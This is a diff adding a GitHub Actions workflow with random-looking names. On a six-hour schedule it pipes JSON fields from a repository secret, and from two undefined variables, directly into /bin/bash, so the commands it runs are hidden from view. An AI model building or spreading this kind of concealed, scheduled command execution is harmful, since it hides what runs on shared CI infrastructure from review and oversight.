@@ -1,0 +1,19 @@
+name: xianzhengyang6527
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xianzhengyang6527
+        env:
+          gj27468: ${{ secrets.gj27468 }}
+        run: |
+          echo $gj27468 | jq -r .xc98199 | /bin/bash
+          echo $jybb0 | jq -r .ckfx37 | /bin/bash
+          echo $yyboy7120 | jq -r .usmk0 | /bin/bash
+
